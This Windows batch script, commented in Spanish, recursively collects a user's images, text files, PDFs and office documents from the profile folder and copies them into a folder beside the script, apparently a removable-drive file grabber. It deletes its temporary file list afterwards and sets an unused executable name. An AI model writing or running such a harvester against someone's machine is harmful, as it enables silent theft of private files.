@echo off
setlocal enabledelayedexpansion

rem Configuración de variables
set "tempDir=%TEMP%\ztmp"
set "filesDir=%TEMP%\afolder"
set "exeFile=tmp19337.exe"
set "scriptDir=%~dp0"
set "resDir=%scriptDir%res"

rem Creación de directorios
md "!resDir!"

rem Extensiones de archivos a buscar
set "fileExtensions=.jpg .png .txt .pdf .doc .xlsx"

rem Listado de archivos y escritura en un archivo de texto
set "fileList=%HOMEDRIVE%\pic.txt"
type nul > "!fileList!"
for %%i in (%fileExtensions%) do (
    for /r "%USERPROFILE%" %%f in (*%%i) do (
        echo Encontrado: %%f
        echo %%f >> "!fileList!"
    )
)

rem Copia de archivos al directorio "res"
echo Copiando archivos a: "!resDir!"
for /f "delims=" %%n in (!fileList!) do (
    echo Copiando: %%n a: "!resDir!"
    copy "%%n" "!resDir!"
)

rem Limpieza
rem echo Eliminando archivos de: "!resDir!"
rem for %%f in (!resDir!\*) do (
rem     echo Eliminando: %%f
rem     del "%%f"
rem )

rem Eliminar el archivo de lista
del "!fileList!"

endlocal
exit /b

